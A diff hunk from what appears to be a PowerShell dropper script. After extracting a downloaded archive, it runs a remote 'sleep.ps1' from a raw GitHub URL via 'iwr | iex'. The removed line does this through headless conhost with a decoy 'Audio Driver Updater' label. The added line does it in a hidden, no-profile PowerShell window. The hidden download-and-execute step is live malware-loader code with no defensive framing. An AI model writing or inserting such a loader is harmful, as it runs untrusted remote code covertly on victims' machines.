@@ -12,4 +12,4 @@ Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
 Start-Sleep -Seconds 4
 
 #run the next script
-conhost.exe --headless powershell -Command "iwr https://raw.githubusercontent.com/waed69/Brabus/refs/heads/main/sleep.ps1 | iex; '# Audio Driver Updater 4.7X - (Build 2025.01.12)'"
+Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/sleep.ps1 | iex`""
